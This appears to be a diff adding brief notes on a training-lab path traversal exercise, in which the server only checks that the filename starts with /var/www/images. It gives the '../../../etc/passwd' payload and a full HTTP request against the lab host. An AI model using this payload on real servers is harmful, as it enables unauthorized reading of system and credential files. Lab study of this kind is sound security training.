@@ -1,0 +1,21 @@
+File path traversal, validation of start of path
+
+The server checks if the supplied path starts with /var/www/images, but it's free game after that. 
+
+Payload:
+../../../etc/passwd
+
+Request:
+
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
+Host: acde1f311f03f977808ba69700f80037.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acde1f311f03f977808ba69700f80037.web-security-academy.net/
+Connection: close
+Cookie: session=5jawOlUpfx1SWdcQE2ypEnDgz4DwnuOo
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
